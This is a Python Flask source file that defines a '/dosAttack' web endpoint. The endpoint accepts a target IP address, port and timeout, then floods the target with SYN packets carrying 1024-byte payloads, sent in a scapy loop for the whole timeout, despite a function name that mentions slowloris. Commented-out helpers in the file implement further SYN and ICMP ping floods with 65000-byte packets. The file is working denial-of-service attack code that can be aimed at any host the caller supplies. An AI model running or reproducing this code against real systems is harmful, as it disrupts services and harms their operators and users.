from flask import Blueprint, request
import nmap
import subprocess
from scapy.layers.inet import IP, TCP, ICMP
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.volatile import RandShort
import time

dosAttack = Blueprint("dosAttack", __name__, url_prefix="/dosAttack")

@dosAttack.post("/")
def slowlorisDosAttack():
    data = request.get_json()
    ipAddress = data["ipAddress"]
    portNumber = int(data["portNumber"])
    # type = data["type"]
    timeout = int(data["timeout"])

    # ip = ipAddress
    # port = int(portNumber)
    # send_syn(ip, port, number_of_packets_to_send=10000)
    # send_ping(ip, number_of_packets_to_send=10000)


    ip = IP(dst=ipAddress)
    tcp = TCP(sport=RandShort(), dport=portNumber, flags="S")
    raw = Raw(b"X"*1024)
    # stack up the layers
    p = ip / tcp / raw
    # Get the current time
    start_time = time.time()

    # Send the constructed packet in a loop for 60 seconds
    while time.time() - start_time < timeout:
        send(p, verbose=0)

    return "hi"


# def send_syn(target_ip_address: str, target_port: int, number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
#     ip = IP(dst=target_ip_address)
#     tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
#     raw = Raw(b"X" * size_of_packet)
#     p = ip / tcp / raw
#     send(p, count=number_of_packets_to_send, verbose=0)
#     print('send_syn(): Sent ' + str(number_of_packets_to_send) + ' packets of ' + str(size_of_packet) + ' size to ' + target_ip_address + ' on port ' + str(target_port))


# def send_ping(target_ip_address: str, number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
#     ip = IP(dst=target_ip_address)
#     icmp = ICMP()
#     raw = Raw(b"X" * size_of_packet)
#     p = ip / icmp / raw
#     send(p, count=number_of_packets_to_send, verbose=0)
#     print('send_ping(): Sent ' + str(number_of_packets_to_send) + ' pings of ' + str(size_of_packet) + ' size to ' + target_ip_address)
